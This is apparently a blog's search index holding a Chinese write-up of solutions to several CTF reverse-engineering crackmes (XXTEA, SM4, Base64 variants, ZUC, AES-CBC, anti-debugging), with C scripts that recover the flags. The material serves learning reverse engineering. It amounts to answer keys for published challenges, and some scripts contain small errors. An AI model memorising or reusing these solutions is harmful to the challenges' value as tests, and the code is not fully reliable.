<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUU刷题记录</title>
      <link href="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<span id="more"></span> <h1 id="红帽杯-XX"><a href="#红帽杯-XX" class="headerlink" title="红帽杯-XX"></a>红帽杯-XX</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>xxtea、异或、换位</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>整个过程就是取前四个输入作为密钥，先进行XXTEA加密，然后位置互换混淆，最后进行异或加密</p><h3 id="取密钥"><a href="#取密钥" class="headerlink" title="取密钥"></a>取密钥</h3><p>这里判断取出前四位，判断是否为数组内的元素，因为如果不是的话，最后V11=V14退出程序</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650329798015.png"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650329952441.png" alt="v6元素"></p><p>取出地址中存储的字符，保证其不为0，下面那个循环是将取出的key末尾填充0</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330081892.png"></p><p>我们的key是int型，这里传参时强制转为char型</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330189857.png"></p><p>函数内部起始段是将我们传入的key转为int型，转换大小端序，因为原本是flag，转为int之后就变成了galf</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330259305.png"></p><p>然后xxtea加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330294507.png"></p><h3 id="打乱位置"><a href="#打乱位置" class="headerlink" title="打乱位置"></a>打乱位置</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330367612.png"></p><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330508850.png" alt="index初始值"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330454278.png"></p><p>这段的逻辑就是只要是3的倍数就取出来异或，index从1开始，所以0、1、2下标的字符都不会被加密，3、4、5进行一次加密，异或的值为下标为0的enc_flag，6、7、8则两次，异或的值为下标为0、1的加密后的字符，依次往后，直到21、22、23，此时异或前六位加密字符</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>xxtea</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;string.&gt;#define xxtea_DELTA 0x9e3779b9#define xxtea_MX (((xxtea_z&gt;&gt;5^xxtea_y&lt;&lt;2) + (xxtea_y&gt;&gt;3^xxtea_z&lt;&lt;4)) ^ ((xxtea_sum^xxtea_y) + (xxtea_key[(xxtea_p&amp;3)^xxtea_e] ^ xxtea_z)))void xxtea(uint32_t* xxtea_origin, int xxtea_n, uint32_t const xxtea_key[4]){    uint32_t xxtea_y, xxtea_z, xxtea_sum;    unsigned xxtea_p, xxtea_rounds, xxtea_e;    if (xxtea_n &gt; 1)            /* Coding Part */    {        xxtea_rounds = 6 + 52 / xxtea_n;        xxtea_sum = 0;        xxtea_z = xxtea_origin[xxtea_n - 1];        do        {            xxtea_sum += xxtea_DELTA;            xxtea_e = (xxtea_sum &gt;&gt; 2) &amp; 3;            for (xxtea_p = 0; xxtea_p &lt; xxtea_n - 1; xxtea_p++)            {                xxtea_y = xxtea_origin[xxtea_p + 1];                xxtea_z = xxtea_origin[xxtea_p] += xxtea_MX;            }            xxtea_y = xxtea_origin[0];            xxtea_z = xxtea_origin[xxtea_n - 1] += xxtea_MX;        } while (--xxtea_rounds);    }    else if (xxtea_n &lt; -1)      /* Decoding Part */    {        xxtea_n = -xxtea_n;        xxtea_rounds = 6 + 52 / xxtea_n;        xxtea_sum = xxtea_rounds * xxtea_DELTA;        xxtea_y = xxtea_origin[0];        do        {            xxtea_e = (xxtea_sum &gt;&gt; 2) &amp; 3;            for (xxtea_p = xxtea_n - 1; xxtea_p &gt; 0; xxtea_p--)            {                xxtea_z = xxtea_origin[xxtea_p - 1];                xxtea_y = xxtea_origin[xxtea_p] -= xxtea_MX;            }            xxtea_z = xxtea_origin[xxtea_n - 1];            xxtea_y = xxtea_origin[0] -= xxtea_MX;            xxtea_sum -= xxtea_DELTA;        } while (--xxtea_rounds);    }}int main(){    //0x40CEA5BC,0xE7B2B2F4,0x129D12A9,0x5BC810AE,0x1D06D73D,0xDCF800DCunsigned int enc[6] = { 0x40CEA5BC,0xE7B2B2F4,0x129D12A9,0x5BC810AE,0x1D06D73D,0xDCF870DC };unsigned int key[4] = { (unsigned int)0x67616c66,(unsigned int)0x0,(unsigned int)0x0,(unsigned int)0x0 };    xxtea(enc, -6, key);    for (int i = 0; i &lt; 6; ++i)    {        printf("%c%c%c%c",((char*)&amp;enc[i])[0], ((char*)&amp;enc[i])[1], ((char*)&amp;enc[i])[2], ((char*)&amp;enc[i])[3]);    }//强制转为char然后依次取出，这样就不会逆序了return 0;}</code></pre><p>异或和位置互换</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(){unsigned char data[24] = {0xCE, 0xBC, 0x40, 0x6B, 0x7C, 0x3A, 0x95, 0xC0, 0xEF, 0x9B, 0x20, 0x20, 0x91, 0xF7, 0x02, 0x35,0x23, 0x18, 0x02, 0xC8, 0xE7, 0x56, 0x56, 0xFA};int count = 0;for (int i = 23; i &gt;= 0; --i)//因为最后的加密数据和前面的有关系，所以要从前往后{for (int j = 6 - count; j &gt;= 0; --j)//并且分为了多轮，除去前三个不需要异或，剩下7组，又是小于8，所以从下标为6开始{data[i] ^= data[j];}if (i % 3 == 0){count++;}}char encode_flag2[24] = { 0 };//交换还原encode_flag2[2]= *data;*encode_flag2= data[1];encode_flag2[3]= data[2];encode_flag2[1]= data[3];encode_flag2[6]= data[4];encode_flag2[4]= data[5];encode_flag2[7]= data[6];encode_flag2[5]= data[7];encode_flag2[10]= data[8];encode_flag2[8]= data[9];encode_flag2[11]= data[10];encode_flag2[9]= data[11];encode_flag2[14]= data[12];encode_flag2[12]= data[13];encode_flag2[15]= data[14];encode_flag2[13]= data[15];encode_flag2[18]= data[16];encode_flag2[16]= data[17];encode_flag2[19]= data[18];encode_flag2[17]= data[19];encode_flag2[22]= data[20];encode_flag2[20]=data[21] ;encode_flag2[23]= data[22];for (int i = 0; i &lt; 24; ++i){printf("0x%X,", encode_flag2[i]&amp;0xff);}return 0;}</code></pre><h1 id="安洵杯-2019-crackMe"><a href="#安洵杯-2019-crackMe" class="headerlink" title="[安洵杯 2019]crackMe"></a>[安洵杯 2019]crackMe</h1><h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><p>SM4、Base64变表加密、换位</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>这里我和别人不一样，我运行不了程序，所以没办法动调，只能X查看交叉引用</p><p>进去定位到主加密函数</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333197817.png"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333231195.png"></p><h3 id="初始化密钥"><a href="#初始化密钥" class="headerlink" title="初始化密钥"></a>初始化密钥</h3><p>对key查看交叉引用，可以进入这里，看一下对赋值后的字符串处理</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333257430.png"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333345804.png"></p><p>通过FindCrypt可以知道是SM4加密，所以这一段就是初始化密钥了</p><h3 id="SM4加密"><a href="#SM4加密" class="headerlink" title="SM4加密"></a>SM4加密</h3><p>回到encode函数</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333436418.png"></p><p>可以发现最后将加密后的字符串给到了final</p><h3 id="Base64加密"><a href="#Base64加密" class="headerlink" title="Base64加密"></a>Base64加密</h3><p>对final查看交叉引用，发现对其进行了加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333588664.png"></p><p>这里解释一下一些东西</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333635363.png"></p><blockquote><p><strong>我们base64就是将三个字符也就是24位转为4个6位，做索引，这里使用移位直接将三个字符成为一个int型，也就是每个左移8位，而待会取出的时候右移四位即可取出，实现了8位与6位的转换，比较有意思</strong></p></blockquote><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333792600.png"></p><p>在红框函数中将传入的6位索引进行+24，也就是(index+24)%64，我们可以将base64表整体左移，就相当于index+24了</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333896782.png"></p><p>再对base64表查看交叉引用，发现了将大小写转换</p><h3 id="换位"><a href="#换位" class="headerlink" title="换位"></a>换位</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333519884.png"></p><p>可以看到这里将最后用来对比的字符串每两个字符进行互换</p><h2 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;char base64_table[] = "yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx";char* base64_encode(char code[], char str[]){int code_len = strlen(code);int str_len ;if (code_len%3){str_len = (code_len / 3 + 1 ) * 4;}elsestr_len = (code_len / 3) * 4;int i = 0, i_ = 0;for (; i &lt; code_len; i += 3, i_ += 4){str[i_] = base64_table[code[i]&gt;&gt; 2];str[i_ + 1] = base64_table[((code[i] &amp; 0x03) &lt;&lt; 4) | ((code[i + 1] &amp; 0xf0) &gt;&gt; 4)];str[i_ + 2] = base64_table[((code[i+1] &amp; 0x0f) &lt;&lt; 2) | ((code[i + 2] &amp; 0xc0) &gt;&gt; 6)];str[i_ + 3] = base64_table[(code[i + 2] &amp; 0x3f)];}if (code_len % 3 == 1){str[i_-1] = '=';str[i_ - 2] = '=';}else if (code_len % 3 == 2){str[i_-1] = '=';}return str;}int findIndex(char c, char b64_table[]){for (int i = 0; i &lt; 64; ++i){if (c == b64_table[i])return i;}}int str_len;char* base64_decode(char code[], char str[], char b64_table[]){char memstr[200] = { 0 };memcpy(memstr, code, strlen(code));int len = strlen(code);if (strstr(code, "=="))str_len = len / 4 * 3 - 2;else if (strstr(code, "="))str_len = len / 4 * 3 - 1;elsestr_len = len / 4 * 3;for (int i = 0, i_ = 0; i &lt; len; i += 4, i_ += 3){str[i_] = (findIndex(memstr[i], b64_table) &lt;&lt; 2) | (findIndex(memstr[i + 1], b64_table) &amp; 0x30) &gt;&gt; 4;str[i_+1]= (findIndex(memstr[i+1], b64_table)&amp;0xf)&lt;&lt;4 | (findIndex(memstr[i + 2], b64_table) &amp; 0x3c) &gt;&gt; 2;str[i_ + 2] = (findIndex(memstr[i + 2], b64_table) &amp; 0x03) &lt;&lt; 6 | (findIndex(memstr[i + 3], b64_table));}str[str_len] = 0;return str;}int main(){char code[100] = "1UTAOIkpyOSWGv/mOYFY4R==";char decode[100] = { 0 };char encode[100] = { 0 };//两位交换for (int i = 0; i &lt; strlen(code); i += 2){char v2 = code[i];code[i] = code[i + 1];code[i + 1] = v2;                         // 每两个之间进行交换}/*base64_encode(code, encode); printf("%s\n", encode);*/base64_decode(code, decode,base64_table);if (decode == 0){return 0;}for (int i = 0; i &lt; str_len; ++i){printf("%02X", decode[i] &amp; 0xff);}return 0;}</code></pre><p>得到59D095290DF2400614F48D276906874E</p><p>SM4解密</p><p><a href="https://the-x.cn/cryptography/Sm4.aspx">https://the-x.cn/cryptography/Sm4.aspx</a></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650334038696.png"></p><h1 id="SWPU2019-ReverseMe"><a href="#SWPU2019-ReverseMe" class="headerlink" title="[SWPU2019]ReverseMe"></a>[SWPU2019]ReverseMe</h1><h2 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h2><p>异或、ZUC算法</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>先异或SWPU_2019_CTF，再异或ZUC算法生成的数据</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350768675.png" alt="异或"></p><p>ZUC算法生成异或的值</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350800049.png"></p><p>unsigned int 的异或，通过动调也可以知道</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350725823.png" alt="xor"></p><h2 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-c" data-language="c"><code class="language-c">unsigned int data[8] = {0xCA3E0C86, 0x19AED798, 0xA66B77E2, 0xB077A16A, 0x05379169, 0x307BF97A, 0x104B5A43, 0x28D47D86};unsigned int final[8] = {0xF80F37B3, 0x5DAEBCBC, 0x864D5ABA, 0xD3629744, 0x1624BA4F, 0x1A729F0B, 0x266D6865, 0x67C86BBA};int j = 0;char k[] = { 0 };for (int i = 0; i &lt; 8; ++i){final[i] ^= data[i];k[j++] = ((char*)&amp;final[i])[0];k[j++] = ((char*)&amp;final[i])[1];k[j++] = ((char*)&amp;final[i])[2];k[j++] = ((char*)&amp;final[i])[3];}k[j] = 0;char key[] = "SWPU_2019_CTF";for (int i = 0; i &lt; 32; ++i){k[i] ^= key[i % 13];printf("%c", k[i]);}</code></pre><h1 id="MRCTF2020-EasyCpp"><a href="#MRCTF2020-EasyCpp" class="headerlink" title="[MRCTF2020]EasyCpp"></a>[MRCTF2020]EasyCpp</h1><h2 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h2><p>异或、替换，素因数分解</p><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>一些关键的都已经标识出来了</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331362066.png"></p><h3 id="读取输入"><a href="#读取输入" class="headerlink" title="读取输入"></a>读取输入</h3><p>读取9次key，并且拼接起来</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331630377.png"></p><h3 id="异或-1"><a href="#异或-1" class="headerlink" title="异或"></a>异或</h3><p>这里面是和1异或</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331969448.png"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331929652.png"></p><h3 id="素因数分解"><a href="#素因数分解" class="headerlink" title="素因数分解"></a>素因数分解</h3><p>这里只要能整除i，就重新进入递归，参数为整除i后的数，如果i遍历完不符合，结束循环，然后拼接上空格</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332066496.png"></p><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332316391.png"></p><p>将数字换成字母，空格换为=</p><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>红框数组存储的是最后比较的字符串</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332398066.png"></p><h2 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h2><p>这里我直接手动替换算出来的</p><pre class="language-c" data-language="c"><code class="language-c">printf("%d", (293 * 8) ^ 1);printf("%d", (1223) ^ 1);printf("%d", (11 * 7 * 5 * 5 * 3) ^ 1);printf("%d", (2477) ^ 1); printf("%d", (125 * 27) ^ 1);printf("%d", (3 * 3011) ^ 1);printf("%d", (13 * 7 * 27) ^ 1);printf("%d", (353 * 5 * 2) ^ 1);</code></pre><p>md5即可</p><h1 id="SCTF2019-Creakme"><a href="#SCTF2019-Creakme" class="headerlink" title="SCTF2019-Creakme"></a>SCTF2019-Creakme</h1><h2 id="考点-4"><a href="#考点-4" class="headerlink" title="考点"></a>考点</h2><p>AES-CBC加密、Base64加密、反调试、SMC</p><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><h3 id="反调试、SMC"><a href="#反调试、SMC" class="headerlink" title="反调试、SMC"></a>反调试、SMC</h3><p>一看到这种遍历段名称的操作，熟悉SMC自解密的应该知道这是敏感的操作，也就是解密操作</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335524731.png"></p><p>对于这种在输入开始前的反调试，采用attach to process</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335425994.png" alt="反调试"></p><p>可以看到如果不是调试状态，就将数据强制转为函数指针</p><p>这里已经解密完并执行完程序了</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335630803.png"></p><p>对其交叉引用可以看到</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335692377.png"></p><h3 id="AES-CBC、Base64加密"><a href="#AES-CBC、Base64加密" class="headerlink" title="AES-CBC、Base64加密"></a>AES-CBC、Base64加密</h3><p>动调发现这就是加密函数</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336067526.png"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336317921.png" alt="AES-CBC"></p><p>可以知道该函数就是初始化密钥</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336575248.png"></p><p>从这里的明文异或结合CBC可以知道是CBC模式</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337171206.png" alt="明文异或"></p><p>key和iv分别为sycloversyclover、sctfsctfsctfsctf</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336622490.png" alt="iv"></p><p>这里很多this指针，但是我们还是可以通过一些特征以及FindCrypt发现这是AES中的key的初始化</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336696808.png"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336732282.png" alt="轮常量异或"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336808010.png" alt="S表替换"></p><p>AES-CBC加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337454010.png" alt="明文与iv向量的异或"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337280514.png" alt="内部加密"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336891802.png" alt="base64"></p><p>进入该函数中，明显是base64加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336933402.png"></p><p>找到码表，发现没有被改过 </p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336989928.png"></p><h3 id="比较-1"><a href="#比较-1" class="headerlink" title="比较"></a>比较</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337016203.png"></p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337028435.png"></p><h1 id="SCTF2019-babyre"><a href="#SCTF2019-babyre" class="headerlink" title="SCTF2019-babyre"></a>SCTF2019-babyre</h1><h2 id="考点-5"><a href="#考点-5" class="headerlink" title="考点"></a>考点</h2><p>base64解密、Maze、移位与异或、花指令</p><h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>花指令就不说了，全部都是一样的，去除即可</p><p>迷宫也没啥说的，注意这里是三维迷宫 <strong>ddwwxxssxaxwwaasasyywwdd</strong> </p><h3 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h3><p>可以看到这里先将我们的输入去table找索引，然后&amp;0x3F取出最后的六位，按位与上v5左移6，这样就得到了8位的字符，加上=4的判断，类似于base64的解密操作</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650339409043.png"></p><p>直接将最后的字符串加密即可<strong>c2N0Zl85MTAy</strong></p><h3 id="换位异或"><a href="#换位异或" class="headerlink" title="换位异或"></a>换位异或</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340193709.png"></p><p>加密流程：每四个输入存入int型的变量，然后进行xor_enc加密，将前四个字符加密后存放到第四个字符的后一个字符，依次往后。</p><blockquote><p><strong>之所以要这样进行移位是因为如果强制转为int型，由于小端序，存储的时候是12345678，这样int取出的时候就变成了4321</strong></p></blockquote><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340446709.png" alt="xor_enc"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340461185.png"></p><p>xor_enc加密流程：将第二第三第四个字符进行异或，分为四个字节去table找到对应的值，然后重新组合成int型，再经过一系列左移右移异或操作并返回，再将返回值与第一个字符异或，这样就得到了一个加密后的结果，这里要一直等到index&lt;=29，也就是前四个字符不会加密</p><p>我们可以看到这里v10只有26，那么26、27、28、29下标的v10就赋值给了v11、v12、v13、v14</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340936262.png"></p><p>取出最后四个int型存储的十六个字节，存储到enc_flag数组，然后比较</p><blockquote><p><strong>假设int a=0x12345678,那么HIBYTE(a)=0x12,BYTE2(a)=0x34,BYTE1(a)=0x56</strong></p></blockquote><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340991543.png"></p><p>这样我们就知道了最后的四个int型的元素，往前推，29是怎么来的呢，是flag[25]^enc(flag[26],flag[27],flag[28])得到的，所以flag[29]^enc(flag[26],flag[27],flag[28])即可得到flag[25]，前面的元素同理</p><h2 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h2><p>因为涉及了ida的左右移位操作，而ida目录下defs.h有定义，所以可以直接引用</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include"defs.h"unsigned int v3[273] = {    0x000000D6, 0x00000090, 0x000000E9, 0x000000FE, 0x000000CC, 0x000000E1, 0x0000003D, 0x000000B7,    0x00000016, 0x000000B6, 0x00000014, 0x000000C2, 0x00000028, 0x000000FB, 0x0000002C, 0x00000005,    0x0000002B, 0x00000067, 0x0000009A, 0x00000076, 0x0000002A, 0x000000BE, 0x00000004, 0x000000C3,    0x000000AA, 0x00000044, 0x00000013, 0x00000026, 0x00000049, 0x00000086, 0x00000006, 0x00000099,    0x0000009C, 0x00000042, 0x00000050, 0x000000F4, 0x00000091, 0x000000EF, 0x00000098, 0x0000007A,    0x00000033, 0x00000054, 0x0000000B, 0x00000043, 0x000000ED, 0x000000CF, 0x000000AC, 0x00000062,    0x000000E4, 0x000000B3, 0x0000001C, 0x000000A9, 0x000000C9, 0x00000008, 0x000000E8, 0x00000095,    0x00000080, 0x000000DF, 0x00000094, 0x000000FA, 0x00000075, 0x0000008F, 0x0000003F, 0x000000A6,    0x00000047, 0x00000007, 0x000000A7, 0x000000FC, 0x000000F3, 0x00000073, 0x00000017, 0x000000BA,    0x00000083, 0x00000059, 0x0000003C, 0x00000019, 0x000000E6, 0x00000085, 0x0000004F, 0x000000A8,    0x00000068, 0x0000006B, 0x00000081, 0x000000B2, 0x00000071, 0x00000064, 0x000000DA, 0x0000008B,    0x000000F8, 0x000000EB, 0x0000000F, 0x0000004B, 0x00000070, 0x00000056, 0x0000009D, 0x00000035,    0x0000001E, 0x00000024, 0x0000000E, 0x0000005E, 0x00000063, 0x00000058, 0x000000D1, 0x000000A2,    0x00000025, 0x00000022, 0x0000007C, 0x0000003B, 0x00000001, 0x00000021, 0x00000078, 0x00000087,    0x000000D4, 0x00000000, 0x00000046, 0x00000057, 0x0000009F, 0x000000D3, 0x00000027, 0x00000052,    0x0000004C, 0x00000036, 0x00000002, 0x000000E7, 0x000000A0, 0x000000C4, 0x000000C8, 0x0000009E,    0x000000EA, 0x000000BF, 0x0000008A, 0x000000D2, 0x00000040, 0x000000C7, 0x00000038, 0x000000B5,    0x000000A3, 0x000000F7, 0x000000F2, 0x000000CE, 0x000000F9, 0x00000061, 0x00000015, 0x000000A1,    0x000000E0, 0x000000AE, 0x0000005D, 0x000000A4, 0x0000009B, 0x00000034, 0x0000001A, 0x00000055,    0x000000AD, 0x00000093, 0x00000032, 0x00000030, 0x000000F5, 0x0000008C, 0x000000B1, 0x000000E3,    0x0000001D, 0x000000F6, 0x000000E2, 0x0000002E, 0x00000082, 0x00000066, 0x000000CA, 0x00000060,    0x000000C0, 0x00000029, 0x00000023, 0x000000AB, 0x0000000D, 0x00000053, 0x0000004E, 0x0000006F,    0x000000D5, 0x000000DB, 0x00000037, 0x00000045, 0x000000DE, 0x000000FD, 0x0000008E, 0x0000002F,    0x00000003, 0x000000FF, 0x0000006A, 0x00000072, 0x0000006D, 0x0000006C, 0x0000005B, 0x00000051,    0x0000008D, 0x0000001B, 0x000000AF, 0x00000092, 0x000000BB, 0x000000DD, 0x000000BC, 0x0000007F,    0x00000011, 0x000000D9, 0x0000005C, 0x00000041, 0x0000001F, 0x00000010, 0x0000005A, 0x000000D8,    0x0000000A, 0x000000C1, 0x00000031, 0x00000088, 0x000000A5, 0x000000CD, 0x0000007B, 0x000000BD,    0x0000002D, 0x00000074, 0x000000D0, 0x00000012, 0x000000B8, 0x000000E5, 0x000000B4, 0x000000B0,    0x00000089, 0x00000069, 0x00000097, 0x0000004A, 0x0000000C, 0x00000096, 0x00000077, 0x0000007E,    0x00000065, 0x000000B9, 0x000000F1, 0x00000009, 0x000000C5, 0x0000006E, 0x000000C6, 0x00000084,    0x00000018, 0x000000F0, 0x0000007D, 0x000000EC, 0x0000003A, 0x000000DC, 0x0000004D, 0x00000020,    0x00000079, 0x000000EE, 0x0000005F, 0x0000003E, 0x000000D7, 0x000000CB, 0x00000039, 0x00000048,    0x000000C6, 0x000000BA, 0x000000B1, 0x000000A3, 0x00000050, 0x00000033, 0x000000AA, 0x00000056,    0x00000097, 0x00000091, 0x0000007D, 0x00000067, 0x000000DC, 0x00000022, 0x00000070, 0x000000B2,};unsigned int encode(unsigned int xor_final){    int v2 = (v3[BYTE2(xor_final)] &lt;&lt; 16) | v3[(unsigned __int8)xor_final] | (v3[BYTE1(xor_final)] &lt;&lt; 8) | (v3[HIBYTE(xor_final)] &lt;&lt; 24);    return __ROL4__(v2, 12) ^ (unsigned int)(__ROL4__(v2, 8) ^ __ROR4__(v2, 2)) ^ __ROR4__(v2, 6);}int main(){    unsigned v10[30] = { 0 };    v10[26] = 0xBE040680;    v10[27] = 0xC5AF7647;    v10[28] = 0x9FCC401F;    v10[29] = 0xD8BF92EF;    for (int i = 25; i &gt;= 0; --i)    {        v10[i] = v10[i + 4] ^ encode(v10[i + 1]^v10[i + 2]^v10[i + 3]);    }    for (int i = 0; i &lt; 4; ++i)    {        printf("%c%c%c%c",((char*)(&amp;v10[i]))[0], ((char*)(&amp;v10[i]))[1], ((char*)(&amp;v10[i]))[2], ((char*)(&amp;v10[i]))[3]);    } return 0;}</code></pre><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650342054912.png"></p><p>这样子就不会存在int型读取时小端序的问题</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Detours学习</title>
      <link href="/2022/04/15/Detours%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/15/Detours%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>API钩取技术</title>
      <link href="/2022/04/15/API%E9%92%A9%E5%8F%96%E6%8A%80%E6%9C%AF/"/>
      <url>/2022/04/15/API%E9%92%A9%E5%8F%96%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
